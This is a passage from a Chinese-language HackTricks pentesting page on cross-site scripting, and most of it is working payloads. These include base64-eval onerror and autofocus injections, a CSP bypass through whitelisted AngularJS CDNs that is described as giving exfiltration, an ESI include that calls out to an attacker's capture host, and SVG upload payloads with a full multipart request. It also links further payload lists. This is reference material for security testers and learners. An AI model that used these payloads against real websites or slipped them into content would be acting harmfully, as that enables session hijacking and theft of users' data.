&lt;script&gt;$.getScript("//domain")&lt;/script&gt;

&lt;!-- xsshunter.com - When &lt;script&gt; is filtered --&gt;
"&gt;&lt;img src=x id=payload&amp;#61;&amp;#61; onerror=eval(atob(this.id))&gt;

&lt;!-- xsshunter.com - Bypassing poorly designed systems with autofocus --&gt;
"&gt;&lt;input onfocus=eval(atob(this.id)) id=payload&amp;#61;&amp;#61; autofocus&gt;

&lt;!-- noscript trick --&gt;
&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;

&lt;!-- whitelisted CDNs in CSP --&gt;
"&gt;&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"&gt;&lt;/script&gt;
&lt;script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"&gt;&lt;/script&gt;
&lt;!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... --&gt;
&lt;div ng-app ng-csp&gt;&lt;textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"&gt;&lt;/textarea&gt;&lt;/div&gt;
</code></pre>
<h3 id="regex---访问隐藏内容"><a class="header" href="#regex---访问隐藏内容">Regex - 访问隐藏内容</a></h3>
<p>从 <a href="https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay"><strong>这篇文章</strong></a> 可以了解到，即使某些值从 JS 中消失，仍然可以在不同对象的 JS 属性中找到它们。例如，REGEX 的输入在正则表达式的输入值被移除后仍然可以找到：</p>
<pre><code class="language-javascript">// Do regex with flag
flag="CTF{FLAG}"
re=/./g
re.test(flag);

// Remove flag value, nobody will be able to get it, right?
flag=""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"])
</code></pre>
<h3 id="暴力破解列表"><a class="header" href="#暴力破解列表">暴力破解列表</a></h3>
<p>{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt" %}</p>
<h2 id="xss-利用其他漏洞"><a class="header" href="#xss-利用其他漏洞">XSS 利用其他漏洞</a></h2>
<h3 id="markdown-中的-xss"><a class="header" href="#markdown-中的-xss">Markdown 中的 XSS</a></h3>
<p>可以注入将被渲染的 Markdown 代码吗？也许你可以获得 XSS！检查：</p>
<p>{% content-ref url="xss-in-markdown.md" %}
<a href="xss-in-markdown.html">xss-in-markdown.md</a>
{% endcontent-ref %}</p>
<h3 id="xss-到-ssrf"><a class="header" href="#xss-到-ssrf">XSS 到 SSRF</a></h3>
<p>在一个 <strong>使用缓存的站点</strong> 上获得了 XSS？尝试通过边缘侧包含注入将其 <strong>升级到 SSRF</strong>，使用这个有效载荷：</p>
<pre><code class="language-python">&lt;esi:include src="http://yoursite.com/capture" /&gt;
</code></pre>
<p>使用它来绕过 cookie 限制、XSS 过滤器等更多！<br />
有关此技术的更多信息，请参见：<a href="../xslt-server-side-injection-extensible-stylesheet-language-transformations.html"><strong>XSLT</strong></a>。</p>
<h3 id="动态创建-pdf-中的-xss"><a class="header" href="#动态创建-pdf-中的-xss">动态创建 PDF 中的 XSS</a></h3>
<p>如果网页使用用户控制的输入创建 PDF，您可以尝试 <strong>欺骗创建 PDF 的机器人</strong> 使其 <strong>执行任意 JS 代码</strong>。<br />
因此，如果 <strong>PDF 创建机器人发现</strong> 某种 <strong>HTML</strong> <strong>标签</strong>，它将会 <strong>解释</strong> 这些标签，您可以 <strong>利用</strong> 这种行为导致 <strong>服务器 XSS</strong>。</p>
<p>{% content-ref url="server-side-xss-dynamic-pdf.md" %}
<a href="server-side-xss-dynamic-pdf.html">server-side-xss-dynamic-pdf.md</a>
{% endcontent-ref %}</p>
<p>如果您无法注入 HTML 标签，尝试 <strong>注入 PDF 数据</strong> 可能是值得的：</p>
<p>{% content-ref url="pdf-injection.md" %}
<a href="pdf-injection.html">pdf-injection.md</a>
{% endcontent-ref %}</p>
<h3 id="amp4email-中的-xss"><a class="header" href="#amp4email-中的-xss">Amp4Email 中的 XSS</a></h3>
<p>AMP 旨在加速移动设备上的网页性能，结合了 HTML 标签和 JavaScript，以确保功能性，同时强调速度和安全性。它支持多种组件以实现各种功能，您可以通过 <a href="https://amp.dev/documentation/components/?format=websites">AMP 组件</a> 访问。</p>
<p><a href="https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/"><strong>AMP for Email</strong></a> 格式将特定的 AMP 组件扩展到电子邮件中，使收件人能够直接在电子邮件中与内容互动。</p>
<p>示例 <a href="https://adico.me/post/xss-in-gmail-s-amp4email"><strong>在 Gmail 中的 Amp4Email XSS 写作</strong></a>。</p>
<h3 id="上传文件-svg-中的-xss"><a class="header" href="#上传文件-svg-中的-xss">上传文件 (svg) 中的 XSS</a></h3>
<p>将以下文件作为图像上传（来自 <a href="http://ghostlulz.com/xss-svg/">http://ghostlulz.com/xss-svg/</a>）：</p>
<pre><code class="language-markup">Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

&lt;?xml version="1.0" standalone="no"?&gt;
&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"&gt;
&lt;rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /&gt;
&lt;script type="text/javascript"&gt;
alert(1);
&lt;/script&gt;
&lt;/svg&gt;
-----------------------------232181429808--
</code></pre>
<pre><code class="language-markup">&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"&gt;
&lt;script type="text/javascript"&gt;alert("XSS")&lt;/script&gt;
&lt;/svg&gt;
</code></pre>
<pre><code class="language-markup">&lt;?xml version="1.0" standalone="no"?&gt;
&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"&gt;
&lt;polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/&gt;
&lt;script type="text/javascript"&gt;
alert("XSS");
&lt;/script&gt;
&lt;/svg&gt;
</code></pre>
<pre><code class="language-svg">&lt;svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
&lt;circle cx="50" cy="50" r="45" fill="green"
id="foo"/&gt;

&lt;foreignObject width="500" height="500"&gt;
&lt;iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&amp;lt;body&amp;gt;&amp;lt;script&amp;gt;document.body.style.background=&amp;quot;red&amp;quot;&amp;lt;/script&amp;gt;hi&amp;lt;/body&amp;gt;" width="400" height="250"/&gt;
&lt;iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/&gt;
&lt;/foreignObject&gt;
&lt;/svg&gt;
</code></pre>
<pre><code class="language-html">&lt;svg&gt;&lt;use href="//portswigger-labs.net/use_element/upload.php#x"/&gt;&lt;/svg&gt;
</code></pre>
<pre><code class="language-xml">&lt;svg&gt;&lt;use href="data:image/svg+xml,&amp;lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &amp;gt;&amp;lt;image href='1' onerror='alert(1)' /&amp;gt;&amp;lt;/svg&amp;gt;#x" /&gt;
</code></pre>
<p>找到 <strong>更多 SVG 载荷在</strong> <a href="https://github.com/allanlw/svg-cheatsheet"><strong>https://github.com/allanlw/svg-cheatsheet</strong></a></p>
<h2 id="其他-js-技巧与相关信息"><a class="header" href="#其他-js-技巧与相关信息">其他 JS 技巧与相关信息</a></h2>
<p>{% content-ref url="other-js-tricks.md" %}
<a href="other-js-tricks.html">other-js-tricks.md</a>
{% endcontent-ref %}</p>
<h2 id="xss-资源"><a class="header" href="#xss-资源">XSS 资源</a></h2>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection</a></li>
<li><a href="http://www.xss-payloads.com">http://www.xss-payloads.com</a> <a href="https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt">https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt</a> <a href="https://github.com/materaj/xss-list">https://github.com/materaj/xss-list</a></li>
<li><a href="https://github.com/ismailtasdelen/xss-payload-list">https://github.com/ismailtasdelen/xss-payload-list</a></li>
<li><a href="https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec">https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec</a></li>
<li><a href="https://netsec.expert/2020/02/01/xss-in-2020.html">https://netsec.expert/2020/02/01/xss-in-2020.html</a></li>
</ul>
<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
<p>如果你对 <strong>黑客职业</strong> 感兴趣并想要攻克不可攻克的目标 - <strong>我们正在招聘！</strong> (<em>需要流利的波兰语书写和口语能力</em>).</p>
<p>{% embed url="https://www.stmcyber.com/careers" %}</p>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术： <img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a>** 上关注我们。**</li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/xxe-xee-xml-external-entity.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/xss-cross-site-scripting/abusing-service-workers.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/xxe-xee-xml-external-entity.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/xss-cross-site-scripting/abusing-service-workers.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
